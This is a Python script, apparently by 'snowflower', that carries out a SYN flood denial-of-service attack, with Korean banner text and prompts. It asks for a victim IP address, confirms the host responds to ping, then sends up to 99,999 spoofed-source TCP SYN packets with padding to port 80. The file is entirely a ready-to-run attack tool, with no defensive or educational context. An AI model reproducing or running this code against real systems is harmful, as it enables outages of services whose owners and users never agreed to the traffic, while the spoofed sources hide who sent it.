from scapy.all import *
import random
import ipaddress
import os

class VictimDevice:
    def __init__(self, ip_addr):
        self.ip_addr = ip_addr

def show_banner():
    print("<< SYN FLOOD 공격")
    print("[!] By snowflower")
    print("[!] Python: snowflower")
    print()
    print("[*] 인터페이스: {}".format(conf.iface))

def is_valid_ip(ip):
    try:
        ip_obj = ipaddress.ip_address(ip)
        # IPv4 주소만 허용
        if ip_obj.version == 4:
            return True
        else:
            return False
    except ValueError:
        return False

def is_ip_reachable(ip_addr):
    # Windows에서는 ping 명령 실행 방식이 다름
    cmd = f"ping -n 1 {ip_addr}"  # -n 1은 하나의 패킷만 보내는 옵션

    # ping 명령 실행
    response = os.system(cmd)

    # 반환 코드가 0이면 IP 주소가 존재함을 의미
    return response == 0

def get_victim_ip():
    while True:
        victim_ip = input("[*] 피해자의 아이피를 써 넣으시오: ")
        if is_valid_ip(victim_ip) and is_ip_reachable(victim_ip):  # IP 주소의 유효성과 존재 여부를 확인
            return VictimDevice(victim_ip)
        else:
            print("Invalid or unreachable IP Address. Please enter a valid and reachable IP.")

def generate_packet(victim_ip):
    packetIP = IP()
    packetIP.src = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
    packetIP.dst = victim_ip.ip_addr
    packetTCP = TCP()
    packetTCP.sport = RandShort()
    packetTCP.dport = 80
    packetTCP.flags = 'S'

    raw = Raw(b"N" * 1024)
    return packetIP / packetTCP / raw

def run_attack(victim):
    try:
        for x in range(0, 99999):
            packet = generate_packet(victim)
            send(packet, verbose=0)
            print("Sent packet {}".format(x))
        input("Press Enter to stop the attack...")
    except Exception as e:
        print("An error occurred during the attack: {}".format(e))

def main():
    show_banner()
    victim = get_victim_ip()
    print("Attack {} ...".format(victim.ip_addr))
    run_attack(victim)

if __name__ == '__main__':
    main()
